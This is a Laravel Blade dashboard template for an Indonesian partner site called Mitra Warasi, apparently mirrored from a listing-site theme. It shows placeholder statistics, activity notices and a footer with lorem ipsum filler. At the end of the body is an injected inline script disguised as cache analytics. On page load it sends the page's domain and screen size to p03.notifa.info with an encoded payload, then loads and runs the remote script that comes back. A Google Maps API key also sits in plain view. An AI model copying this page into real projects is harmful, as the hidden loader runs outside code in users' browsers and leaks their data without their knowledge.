<!DOCTYPE HTML>
<html lang="en">
    
<!-- Mirrored from citybook.kwst.net/dashboard.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 10 Oct 2019 05:34:42 GMT -->
<head>
        <!--=============== basic  ===============-->
        <meta charset="UTF-8">
        <title>Dashboard Mitra Warasi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="robots" content="index, follow"/>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <!--=============== css  ===============-->	
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/reset.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/plugins.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/style.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/color.css') }}">
        <!--=============== favicons ===============-->
        <link rel="shortcut icon" href="{{ asset('template/katalog/images/favicon.ico') }}">
    </head>
    <body>
        <!-- loader -->
        <div class="loader-wrap">
            <div class="pin"></div>
            <div class="pulse"></div>
        </div>
        <!--  loader end -->
        <!-- Main   -->
        <div id="main">
            <!-- header  -->
            <header class="main-header dark-header fs-header sticky">
                <div class="header-inner">
                    <div class="logo-holder">
                        <a href="index-2.html"><img src="{{ asset('template/katalog/images/logo3.png') }}" alt=""></a>
                    </div>
                    <div class="show-search-button"><i class="fa fa-search"></i> <span>Search</span></div>
                    <a href="dashboard-add-listing.html" class="add-list">Add Listing <span><i class="fa fa-plus"></i></span></a>
                    <div class="header-user-menu">
                        <div class="header-user-name">
                            <span><img src="{{ asset('template/katalog/images/avatar/4.jpg') }}" alt=""></span>
                            Hallo , {{ Auth::user()->name }}
                        </div>
                        <ul>
                            <li><a href="dashboard-myprofile.html"> Edit profile</a></li>
                            <li><a href="dashboard-add-listing.html"> Add Listing</a></li>
                            <li><a href="dashboard-bookings.html">  Bookings  </a></li>
                            <li><a href="dashboard-review.html"> Reviews </a></li>
                            <li><a href="{{ url('/mitra/logout') }}" onclick="event.preventDefault();document.getElementById('logout-form').submit();">Logout</a></li>
                            <form id="logout-form" action="{{ url('/mitra/logout') }}" method="POST" style="display: none;">{{ csrf_field() }}</form>
                        </ul>
                    </div>
                    <!-- nav-button-wrap--> 
                    <div class="nav-button-wrap color-bg">
                        <div class="nav-button">
                            <span></span><span></span><span></span>
                        </div>
                    </div>
                    <!-- nav-button-wrap end-->
                    <!--  navigation --> 
                    <div class="nav-holder main-menu">
                        <nav>
                            <ul>
                                <li>
                                    <a href="#">Home <i class="fa fa-caret-down"></i></a>
                                    <!--second level -->   
                                    <ul>
                                        <li><a href="index-2.html">Parallax Image</a></li>
                                        <li><a href="index2.html">Video</a></li>
                                        <li><a href="index3.html">Map</a></li>
                                        <li><a href="index4.html">Slideshow</a></li>
                                        <li><a href="index5.html">Slider</a></li>
										<li><a href="index6.html">Fullscreen Slider</a></li>
                                    </ul>
                                    <!--second level end-->
                                </li>
                                <li>
                                    <a href="#">Listings <i class="fa fa-caret-down"></i></a>
                                    <!--second level -->
                                    <ul>
                                        <li><a href="listing.html">Column map</a></li>
                                        <li><a href="listing2.html">Column map 2</a></li>
                                        <li><a href="listing3.html">Fullwidth Map</a></li>
                                        <li><a href="listing4.html">Fullwidth Map 2</a></li>
                                        <li><a href="listing5.html">Without Map</a></li>
                                        <li><a href="listing6.html">Without Map 2</a></li>
                                        <li>
                                            <a href="#">Single <i class="fa fa-caret-down"></i></a>
                                            <!--third  level  -->
                                            <ul>
                                                <li><a href="listing-single.html">Style 1</a></li>
                                                <li><a href="listing-single2.html">Style 2</a></li>
                                                <li><a href="listing-single3.html">Style 3</a></li>
												<li><a href="listing-single4.html">Style 4</a></li>
                                            </ul>
                                            <!--third  level end-->
                                        </li>
                                    </ul>
                                    <!--second level end-->
                                </li>
                                <li>
                                    <a href="blog.html">News</a>
                                </li>
                                <li>
                                    <a href="#" class="act-link">Pages <i class="fa fa-caret-down"></i></a>
                                    <!--second level -->   
                                    <ul>
                                        <li><a href="about.html">About</a></li>
                                        <li><a href="contacts.html">Contacts</a></li>
                                        <li><a href="author-single.html">User single</a></li>
                                        <li><a href="how-itworks.html">How it Works</a></li>
                                        <li><a href="pricing-tables.html">Pricing</a></li>
                                        <li><a href="dashboard-myprofile.html">User Dasboard</a></li>
                                        <li><a href="blog-single.html">Blog Single</a></li>
                                        <li><a href="dashboard-add-listing.html">Add Listing</a></li>
                                        <li><a href="404.html">404</a></li>
                                        <li><a href="coming-soon.html">Coming Soon</a></li>
                                        <li><a href="header2.html">Header 2</a></li>
                                        <li><a href="footer-fixed.html">Footer Fixed</a></li>
                                    </ul>
                                    <!--second level end-->                                
                                </li>
                            </ul>
                        </nav>
                    </div>
                    <!-- navigation  end -->
                </div>
            </header>
            <!--  header end -->	
            <!-- wrapper -->	
            <div id="wrapper">
                <!--content -->  
                <div class="content">
                    <!--section --> 
                    <section id="sec1">
                        <!-- container -->
                        <div class="container">
                            <!-- profile-edit-wrap -->
                            <div class="profile-edit-wrap">
                                <div class="profile-edit-page-header">
                                    <h2>Admin Panel</h2>
                                    <div class="breadcrumbs"><a href="#">Home</a><span>Dasboard</span></div>
                                </div>
                                <div class="row">
                                    <div class="col-md-3">
                                        <div class="fixed-bar fl-wrap">
                                            <div class="user-profile-menu-wrap fl-wrap">
                                                <!-- user-profile-menu-->
                                                <div class="user-profile-menu">
                                                    <h3>Main</h3>
                                                    <ul>
                                                    	<li><a href="dashboard.html" class="user-profile-act"><i class="fa fa-gears"></i>Dashboard</a></li>
                                                        <li><a href="dashboard-myprofile.html"><i class="fa fa-user-o"></i> Edit profile</a></li>
                                                        <li><a href="dashboard-messages.html"><i class="fa fa-envelope-o"></i> Messages <span>3</span></a></li>
                                                        <li><a href="dashboard-password.html"><i class="fa fa-unlock-alt"></i>Change Password</a></li>
                                                    </ul>
                                                </div>
                                                <!-- user-profile-menu end-->
                                                <!-- user-profile-menu-->
                                                <div class="user-profile-menu">
                                                    <h3>Listings</h3>
                                                    <ul>
                                                        <li><a href="dashboard-listing-table.html"><i class="fa fa-th-list"></i> My listigs  </a></li>
                                                        <li><a href="dashboard-bookings.html"> <i class="fa fa-calendar-check-o"></i> Bookings <span>2</span></a></li>
                                                        <li><a href="dashboard-review.html"><i class="fa fa-comments-o"></i> Reviews </a></li>
                                                        <li><a href="dashboard-add-listing.html"><i class="fa fa-plus-square-o"></i> Add New</a></li>
                                                    </ul>
                                                </div>
                                                <!-- user-profile-menu end-->                                        
                                                <a href="#" class="log-out-btn">Log Out</a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-9">
                                        <!-- profile-edit-container--> 
                                        <div class="profile-edit-container">
                                            <div class="profile-edit-header fl-wrap" style="margin-top:30px">
                                                <h4>Hallo , <span>{{ Auth::user()->name }}</span></h4>
                                            </div>
                                            <div class="notification success fl-wrap">
                                                <p>Your listing <a href="#">Fitness Center Brooklyn</a> has been approved!</p>
                                                <a class="notification-close" href="#"><i class="fa fa-times"></i></a>
                                            </div>                                            
                                                  <!-- statistic-container--> 
                                            <div class="statistic-container fl-wrap">
                                            <!-- statistic-item-wrap--> 
                                            	<div class="statistic-item-wrap"> 
                                            	<div class="statistic-item gradient-bg fl-wrap">
                                                	<i class="fa fa-map-marker"></i>
                                                    <div class="statistic-item-numder">21</div>
                                                    <h5>Active Listings</h5>
                                                </div>
                                                </div>
                                            <!-- statistic-item-wrap end-->                                            
                                            <!-- statistic-item-wrap--> 
                                            	<div class="statistic-item-wrap"> 
                                            	<div class="statistic-item gradient-bg fl-wrap">
                                                	<i class="fa fa fa-eye"></i>
                                                    <div class="statistic-item-numder">1054</div>
                                                    <h5>Listing Views</h5>
                                                </div>
                                                </div>
                                            <!-- statistic-item-wrap end-->                                             
                                            <!-- statistic-item-wrap--> 
                                            	<div class="statistic-item-wrap"> 
                                            	<div class="statistic-item gradient-bg fl-wrap">
                                                	<i class="fa fa-comments-o"></i>
                                                    <div class="statistic-item-numder">675</div>
                                                    <h5>Total Reviews</h5>
                                                </div>
                                                </div>
                                            <!-- statistic-item-wrap end-->                                            
                                            <!-- statistic-item-wrap--> 
                                            	<div class="statistic-item-wrap"> 
                                            	<div class="statistic-item gradient-bg fl-wrap">
                                                	<i class="fa fa-heart-o"></i>
                                                    <div class="statistic-item-numder">154</div>
                                                    <h5>Times Bookmarked</h5>
                                                </div>
                                                </div>
                                            <!-- statistic-item-wrap end-->  
                                            </div>
         									<!-- statistic-container end--> 
                                        </div>
                                        <!-- profile-edit-container end-->  
                                        
                                        <div class="dashboard-list-box fl-wrap activities">
                                            <div class="dashboard-header fl-wrap">
                                                <h3>Recent Activities</h3>
                                            </div>
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-check"></i> Your listing <a href="#">Luxury Restourant</a> has been approved! </p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end-->    
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-heart"></i>Someone bookmarked your <a href="#">Event In City Mol</a> listing!</p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end-->                                           
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-comments-o"></i> Someone left a review on <a href="#">Gym in the Center</a> listing!</p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end-->                                           
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-check"></i> Your listing <a href="#">Luxury Restourant</a> has been approved! </p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end-->    
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-heart"></i>Someone bookmarked your <a href="#">Event In City Mol</a> listing!</p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end-->                                           
                                            <!-- dashboard-list end-->    
                                            <div class="dashboard-list">
                                                <div class="dashboard-message">
                                                    <span class="new-dashboard-item"><i class="fa fa-times"></i></span>
      
                                                    <div class="dashboard-message-text">
                                                        <p><i class="fa fa-comments-o"></i> Someone left a review on <a href="#">Gym in the Center</a> listing!</p>
 	
                                                    </div>
                                                </div>
                                            </div>
                                            <!-- dashboard-list end--> 
                                        </div>                                        
                                                                              
                                    </div>
                                </div>
                            </div>
                            <!--profile-edit-wrap end -->
                        </div>
                        <!--container end -->
                    </section>
                    <!-- section end -->
                    <div class="limit-box fl-wrap"></div>
                </div>
            </div>
            <!-- wrapper end -->
            <!--footer -->
            <footer class="main-footer dark-footer  ">
                <div class="container">
                    <div class="row">
                        <div class="col-md-4">
                            <div class="footer-widget fl-wrap">
                                <h3>Tentang Kami</h3>
                                <div class="footer-contacts-widget fl-wrap">
                                    <p>In ut odio libero, at vulputate urna. Nulla tristique mi a massa convallis cursus. Nulla eu mi magna. Etiam suscipit commodo gravida. Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam. </p>
                                    <ul  class="footer-contacts fl-wrap">
                                        <li><span><i class="fa fa-envelope-o"></i> EMail :</span><a href="#" target="_blank">cs@warasi.id</a></li>
                                        <li> <span><i class="fa fa-map-marker"></i> Alamat :</span><a href="#" target="_blank">Jl. M. Yamin, No.1, Stmik Widya Cipta Dharma</a></li>
                                        <li><span><i class="fa fa-phone"></i> Telepon :</span><a href="#">081234567890</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="footer-widget fl-wrap">
                                <h3>Berita Terkini</h3>
                                <div class="widget-posts fl-wrap">
                                    <ul>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="{{ asset('template/katalog/images/all/1.jpg') }}" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title="">Vivamus dapibus rutrum</a>
                                                <span class="widget-posts-date"> 21 Mar 09.05 </span>
                                            </div>
                                        </li>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="{{ asset('template/katalog/images/all/2.jpg') }}" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title=""> In hac habitasse platea</a>
                                                <span class="widget-posts-date"> 7 Mar 18.21 </span>
                                            </div>
                                        </li>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="{{ asset('template/katalog/images/all/3.jpg') }}" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title="">Tortor tempor in porta</a>
                                                <span class="widget-posts-date"> 7 Mar 16.42 </span>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="footer-widget fl-wrap">
                                <h3>Subscribe</h3>
                                <div class="subscribe-widget fl-wrap">
                                    <p>Want to be notified when we launch a new template or an udpate. Just sign up and we'll send you a notification by email.</p>
                                    <div class="subcribe-form">
                                        <form id="subscribe">
                                            <input class="enteremail" name="email" id="subscribe-email" placeholder="Email" spellcheck="false" type="text">
                                            <button type="submit" id="subscribe-button" class="subscribe-button"><i class="fa fa-rss"></i> Subscribe</button>
                                            <label for="subscribe-email" class="subscribe-message"></label>
                                        </form>
                                    </div>
                                </div>
                                <div class="footer-widget fl-wrap">
                                    <div class="footer-menu fl-wrap">
                                        <ul>
                                            <li><a href="{{ route('home') }}">Home </a></li>
                                            <li><a href="{{ route('berita') }}">Berita</a></li>
                                            <li><a href="{{ route('tentangKami') }}">Tentang Kami</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sub-footer fl-wrap">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-4">
                                <div class="about-widget">
                                    <img src="images/logo.png" alt="">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="copyright"> &#169; Netflix 2019.</div>
                            </div>
                            <div class="col-md-4">
                                <div class="footer-social">
                                    <ul>
                                        <li><a href="#" target="_blank" ><i class="fa fa-facebook-official"></i></a></li>
                                        <li><a href="#" target="_blank"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-chrome"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-vk"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-whatsapp"></i></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            <!--footer end  -->
            <!--register form -->
            <div class="main-register-wrap modal">
                <div class="main-overlay"></div>
                <div class="main-register-holder">
                    <div class="main-register fl-wrap">
                        <div class="close-reg"><i class="fa fa-times"></i></div>
                        <h3>Login <span>Wa<strong>Rasi</strong></span></h3>
                        <div class="soc-log fl-wrap">
                            <a href="{{ url('/user/login') }}" class="facebook-log"><i class="fa fa-users"></i>Login Sebagai Pengguna</a>
                            <a href="{{ url('/mitra/login') }}" class="facebook-log"><i class="fa fa-users"></i> Login Sebagai Mitra</a>
                        </div>
                    </div>
                </div>
            </div>
            <!--register form end -->
            <a class="to-top"><i class="fa fa-angle-up"></i></a>
        </div>
        <!-- Main end -->
        <!--=============== scripts  ===============-->     
        <script type="text/javascript" src="{{ asset('template/katalog/js/jquery.min.js') }}"></script>
        <script type="text/javascript" src="{{ asset('template/katalog/js/plugins.js') }}"></script>
        <script type="text/javascript" src="{{ asset('template/katalog/js/scripts.js') }}"></script>
		<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDwJSRi0zFjDemECmFl9JtRj1FY7TiTRRo&amp;libraries=places&amp;callback=initAutocomplete"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprALGls6wsTlqIeIlFLBw%2bMdeqWlHjO9U3CHnC4YdnFktiBhtabNMp40019FS%2bgUo614HfDVWcHr3C8W8KHHQwPfXxzvu%2bDlFjohQoooCVlzAfeQ94L2P2Ki9g2Sw8G85R8BKpJAW4gew%2fAU73S3e%2fmMMiiz%2fwz%2fM6ZLwz5awsKe64Rv1zTHLcao2Ww8vXHYXomx6Xp1Z51htSYapuZQX1udY4I1wcNpwrOvKkVcTBEHM6RAVoKsy3mksFhaPOcFuSDuCqv6TE95Grb9G6yr3wDnb6Px6mSxJIX8fHcaJhpHw1tSDWn7xTtQlskbvOHiOhWvgyJnxvCdZzB8A6%2fzxmjJPoQrAsRDBqBWEkaSLOH%2bVs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>